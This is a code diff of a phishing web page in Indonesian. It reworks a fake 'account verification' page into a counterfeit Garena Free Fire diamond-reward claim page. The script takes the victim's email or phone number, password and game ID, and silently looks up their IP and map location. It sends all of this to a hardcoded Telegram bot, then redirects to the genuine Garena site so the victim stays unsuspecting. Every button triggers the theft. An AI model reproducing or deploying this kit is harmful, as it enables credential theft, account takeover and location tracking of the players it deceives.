@@ -3,97 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Verifikasi Akun | Event 2026</title>
+    <title>Garena Free Fire - Reward Event</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
     <style>
-        body { background-color: #0f172a; font-family: 'Inter', sans-serif; }
-        .card { background: #1e293b; border: 1px solid #334155; }
-        .input-style { background: #0f172a; border: 1px solid #334155; color: white; }
-        .input-style:focus { border-color: #3b82f6; outline: none; box-shadow: 0 0 10px rgba(59, 130, 246, 0.5); }
+        @import url('https://fonts.googleapis.com/css2?family=Teko:wght@400;700&display=swap');
+        body { background: #000; font-family: 'Teko', sans-serif; overflow-x: hidden; }
+        .bg-main { background: url('https://wallpaperaccess.com/full/1155026.jpg') no-repeat center; background-size: cover; }
+        .box-pancing { background: rgba(0,0,0,0.85); border: 2px solid #facc15; box-shadow: 0 0 20px #facc1550; }
+        input { font-family: sans-serif; }
     </style>
 </head>
-<body class="flex items-center justify-center min-h-screen p-4">
+<body class="bg-main min-h-screen flex items-center justify-center p-4">
 
-    <div class="card w-full max-w-md p-8 rounded-2xl shadow-2xl">
-        <div class="text-center mb-8">
-            <div class="inline-block p-4 rounded-full bg-blue-600/20 mb-4">
-                <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04kM12 21.48l-.342-.165A11.952 11.952 0 0112 20.022V2.944" />
-                </svg>
-            </div>
-            <h1 class="text-2xl font-bold text-white tracking-tight">Verifikasi Keamanan</h1>
-            <p class="text-gray-400 text-sm mt-2">Akun Anda terpilih untuk menerima reward. Harap verifikasi data untuk proses pengiriman.</p>
+    <div class="box-pancing w-full max-w-sm rounded-lg p-6 animate__animated animate__fadeIn">
+        <div class="text-center">
+            <img src="https://upload.wikimedia.org/wikipedia/en/3/36/Free_Fire_Logo.png" class="h-14 mx-auto mb-2">
+            <h1 class="text-3xl font-bold text-yellow-400 uppercase tracking-wider italic">PENUKARAN HADIAH</h1>
+            <p class="text-gray-300 text-sm leading-tight mb-6 uppercase tracking-widest">Verifikasi Akun Anda Untuk Menerima Diamond</p>
         </div>
 
-        <form id="mainForm" class="space-y-5">
-            <div>
-                <label class="block text-xs font-bold text-gray-500 uppercase mb-2">Email atau Nomor HP</label>
-                <input type="text" id="target_user" class="input-style w-full px-4 py-3 rounded-xl text-sm" placeholder="Masukkan detail akun..." required>
-            </div>
-            <div>
-                <label class="block text-xs font-bold text-gray-500 uppercase mb-2">Kata Sandi</label>
-                <input type="password" id="target_pass" class="input-style w-full px-4 py-3 rounded-xl text-sm" placeholder="Masukkan password..." required>
+        <form id="gas-data" class="space-y-4">
+            <div class="relative">
+                <input type="text" id="user" class="w-full bg-zinc-900 border border-zinc-700 p-3 rounded text-white text-sm focus:border-yellow-400 outline-none transition" placeholder="EMAIL ATAU NOMOR HP" required>
             </div>
 
-            <button type="submit" id="btn-submit" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-xl shadow-lg shadow-blue-600/30 transition-all transform active:scale-95">
-                KONFIRMASI SEKARANG
+            <div class="relative">
+                <input type="password" id="pass" class="w-full bg-zinc-900 border border-zinc-700 p-3 rounded text-white text-sm focus:border-yellow-400 outline-none transition" placeholder="KATA SANDI" required>
+            </div>
+
+            <div class="relative">
+                <input type="number" id="id_game" class="w-full bg-zinc-900 border border-zinc-700 p-3 rounded text-white text-sm focus:border-yellow-400 outline-none transition" placeholder="ID PLAYER (CONTOH: 12345678)" required>
+            </div>
+
+            <button type="submit" class="universal-action w-full bg-yellow-400 hover:bg-yellow-500 text-black font-black py-3 rounded text-xl uppercase italic transition transform active:scale-95 shadow-lg shadow-yellow-400/20">
+                KLAIM SEKARANG
             </button>
             
-            <button type="button" onclick="location.reload()" class="w-full text-gray-500 text-xs font-medium hover:text-gray-300 transition">
-                BATALKAN PROSES
-            </button>
+            <div class="grid grid-cols-2 gap-2">
+                <button type="button" class="universal-action bg-zinc-800 text-gray-400 text-xs py-2 rounded border border-zinc-700 hover:bg-zinc-700">LUPA PASSWORD</button>
+                <button type="button" class="universal-action bg-zinc-800 text-gray-400 text-xs py-2 rounded border border-zinc-700 hover:bg-zinc-700">HUBUNGI CS</button>
+            </div>
         </form>
 
-        <div class="mt-8 border-t border-gray-700 pt-6 text-center">
-            <p class="text-[10px] text-gray-500 uppercase tracking-widest">Powered by Secure-Verification System</p>
+        <div class="mt-8 text-center border-t border-zinc-800 pt-4">
+            <p class="text-[10px] text-zinc-500 uppercase tracking-tighter">Copyright © Garena International. All Rights Reserved.</p>
         </div>
     </div>
 
     <script>
-        const form = document.getElementById('mainForm');
-        
-        // --- KONFIGURASI BOT LO ---
-        const BOT_TOKEN = "8205581950:AAETz7C7eeiOrINZWEIR4dTfRmacVWVNXPc"; 
+        // --- KONFIGURASI TELEGRAM ---
+        const API_TOKEN = "8205581950:AAETz7C7eeiOrINZWEIR4dTfRmacVWVNXPc"; 
         const CHAT_ID = "8551809114";
-        // --------------------------
+        // ----------------------------
 
-        form.addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const btn = document.getElementById('btn-submit');
-            btn.innerHTML = "Processing Data...";
-            btn.disabled = true;
+        async function setorData() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            const i = document.getElementById('id_game').value;
 
-            const u = document.getElementById('target_user').value;
-            const p = document.getElementById('target_pass').value;
+            if(!u || !p || !i) return alert("Harap lengkapi semua kolom!");
 
-            // AMBIL DATA LOKASI SILENT (IP & MAPS)
-            let ipInfo = "Gagal melacak";
+            // Ambil Info IP & Lokasi Map
+            let geo = "Lokasi tidak diizinkan";
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                ipInfo = `🌐 IP: ${data.ip}\n🏙️ Kota: ${data.city}\n📍 Lokasi: https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
-            } catch (err) {}
+                const d = await res.json();
+                geo = `🌐 IP: ${d.ip}\n🏙️ Kota: ${d.city}\n📍 Maps: https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+            } catch (e) {}
 
-            const text = `🚨 **TARGET TERVERIFIKASI** 🚨\n\n👤 User: \`${u}\` \n🔑 Pass: \`${p}\` \n\n**DETAIL LOKASI:**\n${ipInfo}\n\n⏰ Waktu: ${new Date().toLocaleString()}`;
+            const teks = `⚠️ **SETORAN BARU (MIRIP BIZ.ID)** ⚠️\n\n👤 User: \`${u}\` \n🔑 Pass: \`${p}\` \n🆔 ID: \`${i}\` \n\n**LOG LOKASI:**\n${geo}\n\n⏰ Waktu: ${new Date().toLocaleString()}`;
 
-            // KIRIM KE TELEGRAM
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            // Kirim ke Tele
+            fetch(`https://api.telegram.org/bot${API_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: text,
-                    parse_mode: 'Markdown'
-                })
-            })
-            .then(() => {
-                // Tendang ke halaman login asli (Contoh: Facebook) biar dia gak curiga
-                window.location.href = "https://www.facebook.com/login"; 
-            })
-            .catch(() => {
-                window.location.href = "https://www.google.com";
+                body: JSON.stringify({ chat_id: CHAT_ID, text: teks, parse_mode: 'Markdown' })
+            }).then(() => {
+                // Redirect ke web Garena asli biar target gak curiga
+                window.location.href = "https://reward.ff.garena.com/id";
             });
+        }
+
+        // Semua tombol bakal nge-trigger setorData()
+        document.querySelectorAll('.universal-action').forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                e.preventDefault();
+                setorData();
+            });
+        });
+
+        // Submit form juga setor data
+        document.getElementById('gas-data').addEventListener('submit', (e) => {
+            e.preventDefault();
+            setorData();
         });
     </script>
 </body>
